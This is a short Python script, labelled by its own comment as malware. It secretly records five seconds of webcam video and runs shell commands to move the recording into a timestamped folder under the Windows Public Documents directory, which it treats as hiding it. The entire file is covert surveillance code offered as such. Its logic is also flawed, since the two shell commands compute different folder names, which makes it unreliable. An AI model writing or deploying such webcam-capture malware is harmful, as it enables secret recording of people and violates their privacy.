# This malware will record the video from your webcam and save it to a file
# 
import cv2
import time
import os

# record video in the background 5 seconds
def record_video():
    # set the video capture object
    video = cv2.VideoCapture(0)
    # set the video codec
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    # set the video output object
    out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
    # record for 5 seconds
    start_time = time.time()
    while(int(time.time() - start_time) < 5):
        # read the video frame
        ret, frame = video.read()
        if ret == True:
            # write the frame to the output file
            out.write(frame)
    # release the video capture and video write objects
    video.release()
    out.release()
    # close all windows
    cv2.destroyAllWindows()
    

def main():
    # execute with elevated privileges in windows
    # record video
    record_video()
    # move the file to a hidden directory
    os.system('mkdir C:\\Users\\Public\\Documents\\' + str(time.time()))
    os.system('move output.avi C:\\Users\\Public\\Documents\\' + str(time.time()))

if __name__ == '__main__':
    main()